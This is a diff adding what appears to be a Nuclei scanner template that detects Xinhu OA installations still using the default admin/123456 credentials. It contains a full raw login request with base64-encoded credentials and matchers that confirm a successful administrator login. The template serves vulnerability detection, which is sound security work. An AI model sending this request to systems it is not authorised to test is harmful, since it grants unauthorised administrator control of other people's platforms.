@@ -1,0 +1,33 @@
+id: xinhuoa-default-password
+info:
+  name: XinHuOA index.php Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Xincall OA is a free and open source office OA system. The default password vulnerability allows an attacker to use the default credentials (admin/123456) to control the platform and operate core functions with administrator rights.
+  reference:
+    - http://www.rockoa.com
+  tags: default-password
+http:
+  - raw:
+      - |
+        POST /index.php?a=check&m=login&d=&ajaxbool=true&rnd=300277 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+        Cookie: PHPSESSID=9aag0fhgbdteanq8avmm8eb3q0; deviceid=1659707962697; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0
+
+        rempass=0&jmpass=false&device=1&ltype=0&adminuser=YWRtaW4%3A&adminpass=MTIzNDU2&yanzm=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - xinhu
+      - type: word
+        part: body
+        words:
+          - "\"success\":true,\"face\""
